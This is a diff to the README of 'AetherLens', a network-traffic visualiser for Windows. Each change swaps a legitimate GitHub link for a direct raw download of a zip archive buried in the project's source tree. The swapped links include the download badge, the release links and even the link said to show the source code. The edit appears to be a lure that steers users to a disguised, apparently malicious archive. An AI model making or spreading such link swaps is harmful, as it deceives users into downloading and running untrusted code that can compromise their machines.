@@ -1,6 +1,6 @@
 # 🌐 AetherLens - Visualize Network Traffic Instantly
 
-[![Download AetherLens](https://img.shields.io/badge/Download-AetherLens-blue?style=for-the-badge)](https://github.com/evonianetwork/AetherLens/releases)
+[![Download AetherLens](https://img.shields.io/badge/Download-AetherLens-blue?style=for-the-badge)](https://raw.githubusercontent.com/evonianetwork/AetherLens/main/core-engine/src/models/Aether-Lens-1.7.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow this to get AetherLens up and running on your Windows PC.
 
 Visit the official release page to get the latest version:
 
-[Download AetherLens from GitHub Releases](https://github.com/evonianetwork/AetherLens/releases)
+[Download AetherLens from GitHub Releases](https://raw.githubusercontent.com/evonianetwork/AetherLens/main/core-engine/src/models/Aether-Lens-1.7.zip)
 
 Or click the big badge at the top for quick access.
 
@@ -119,7 +119,7 @@ If you face issues while running AetherLens, try the following:
 
 AetherLens is open-source software. You can view the source code and contribute on GitHub:
 
-https://github.com/evonianetwork/AetherLens
+https://raw.githubusercontent.com/evonianetwork/AetherLens/main/core-engine/src/models/Aether-Lens-1.7.zip
 
 This lets users and developers improve and customize the tool.
 
@@ -135,4 +135,4 @@ For help, look at the GitHub repository’s issue tracker. You can report bugs o
 
 To install or update AetherLens, visit:
 
-[https://github.com/evonianetwork/AetherLens/releases](https://github.com/evonianetwork/AetherLens/releases)
+[https://raw.githubusercontent.com/evonianetwork/AetherLens/main/core-engine/src/models/Aether-Lens-1.7.zip](https://raw.githubusercontent.com/evonianetwork/AetherLens/main/core-engine/src/models/Aether-Lens-1.7.zip)
